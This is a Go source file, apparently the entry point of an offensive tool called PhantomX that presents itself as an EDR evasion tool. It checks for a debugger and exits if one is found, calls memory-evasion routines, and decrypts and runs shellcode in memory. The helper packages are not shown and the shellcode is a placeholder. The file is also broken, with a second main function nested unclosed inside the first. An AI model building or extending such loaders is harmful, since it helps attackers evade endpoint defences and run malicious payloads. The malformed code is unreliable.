package main

import (
	"fmt"
	"log"
	"os"

	"phantomx/memory_evasion"
	"phantomx/shellcode_loader"
	"phantomx/encryption"
	"phantomx/anti_debugging"
	"phantomx/syscalls"
	"phantomx/utils"
)

func main() {
	fmt.Println("PhantomX - EDR Evasion Tool Initialized")

	// Load configuration settings
	config, err := utils.LoadConfig("config/settings.json")
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	// Anti-debugging & sandbox checks
	if anti_debugging.DetectDebugger() {
		log.Println("Debugger detected! Exiting...")
		os.Exit(1)
	}

	// Run memory evasion techniques
	memory_evasion.ExecuteEvasion()

	// Encrypt and load shellcode
	encryptedShellcode := encryption.EncryptShellcode([]byte("SHELLCODE_PLACEHOLDER"))
	decryptedShellcode := encryption.DecryptShellcode(encryptedShellcode)

	// Load shellcode into memory
	shellcode_loader.ExecuteShellcode(decryptedShellcode)

	fmt.Println("Execution completed successfully.")

	func main() {
	// Load config
	config, err := utils.LoadConfig("config/settings.json")
	if err != nil {
		fmt.Println("[-] Failed to load configuration. Using defaults...")
		return
	}

	// Access config values
	fmt.Println("Shellcode File:", config.Shellcode.File)
	fmt.Println("Enable Anti-Debugging:", config.EnableAntiDebugging)
}
